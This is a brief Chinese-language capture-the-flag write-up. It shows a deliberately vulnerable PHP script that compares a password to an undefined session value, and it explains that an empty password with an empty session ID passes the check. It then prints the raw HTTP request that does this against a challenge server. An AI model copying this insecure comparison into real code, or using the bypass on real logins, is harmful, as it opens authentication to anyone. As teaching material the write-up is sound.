# php变量漏洞
``` php
<?php
session_start(); 

include("flag.php");
show_source(__FILE__);

if (isset ($_GET['password'])) {
    if ($_GET['password'] == $_SESSION['password'])
        die ('Flag: '.$flag);
    else
        print '<p>Wrong guess.</p>';
}

mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));
$_SESSION['password'] = mt_rand(); 

?>
```
当把sessionid设置为空的时候,`$_SESSION['password']`是为定义的，所以password传入空字符串，就可以绕过了。
所以构建
``` txt
GET /?password= HTTP/1.1
Host: 124.160.107.92:28012
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
![picture 1](https://libget.com/gkirito/blog/image/2021/image-20210309ZADmbrPT%402x.png)  


